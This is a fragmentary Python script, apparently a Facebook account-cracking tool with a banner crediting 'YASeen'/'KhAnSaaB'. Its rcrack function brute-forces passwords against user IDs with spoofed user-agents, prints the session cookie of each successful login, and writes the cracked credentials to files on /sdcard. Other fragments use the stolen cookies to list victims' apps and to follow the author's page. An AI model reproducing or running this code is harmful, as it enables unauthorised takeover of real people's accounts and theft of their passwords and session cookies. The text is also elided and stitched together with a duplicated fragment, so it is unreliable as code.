...
def cek_apk(session,coki):
    ...
    if len(game)==0:
        ...
        print(f'\r[KhAnSaaB] %s \x1b[1;95m â˜† Your Active Apps â˜†     :{WHITE}'%(GREEN))
    ...
    if len(game)==0:
        ...
        print(f'\r[KhAnSaaB] %s \x1b[1;95m â—‡ Your Expired Apps â—‡    :{WHITE}'%(M))
...
def follow(self, session, coki):
        ...
        r = BeautifulSoup(session.get('https://www.facebook.com/YASeen2189', {
...
\033[1;32m┌━━━━━━━━━━━━━━━━━ \033[1;97mYASEEN\33[0;m \033[1;32m━━━━━━━━━━━━━━━━━━┑

\033[1;32m┃   \033[1;32mCREATED BY\33[0;m   :  \033[1;32mR.YASeen            ┃

┃   \033[1;32mFACEBOK      : \033[1;32m YASeen189              ┃

┃   \033[1;32mGITHUB       :  \033[1;32mYASEEN.CYBER.403        ┃

┃   \033[1;32mTOOL STATUS  :  \033[1;32mTOOL IS FREE            ┃

┃   \033[1;32mTEAM         :  \033[1;32mPRIVATE                 ┃

┃   \033[1;32mTOOL VIRSION :  \033[1;32m0.1                     ┃

┃   \033[1;32mTOOL WORK    :  \033[1;32mONLY DATA               ┃

└━━━━━━━━━━━━━━━━━ \033[1;97mYASeen\33[0;m \033[1;32m━━━━━━━━━━━━━━━━━━┘
...
def rcrack(uid,pwx,tl):
    ...
    try:
        ...
        for ps in pwx:
           ...
           "user-agent": pro}
            ...
            if 'c_user' in log_cookies:
                ...
                print('    \033[1;32m(KhAn SAab-OK)  ' +uid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')

                cek_apk(session,coki)

                open('/sdcard/KhAnSAab-OK.txt', 'a').write( uid+' | '+ps+'\n')
                ...
                print('    \33[1;30m(KhAnSAab-CP)  ' +uid+ ' | ' +ps+           '  \33[0;97m')

                open('/sdcard/KhAnSAab-CP.txt', 'a').write( uid+' | '+ps+' \n')
        ...
        sys.stdout.write('\r     %s[KhAnSAab] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
...
#+x+xx+xxx+ox+xxxx+ugen2+redmi)
           ...
           "user-agent": pro}
            ...
            if 'c_user' in log_cookies:
                ...
                print('    \033[1;32m(KhAnSAab-OK)  ' +uid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
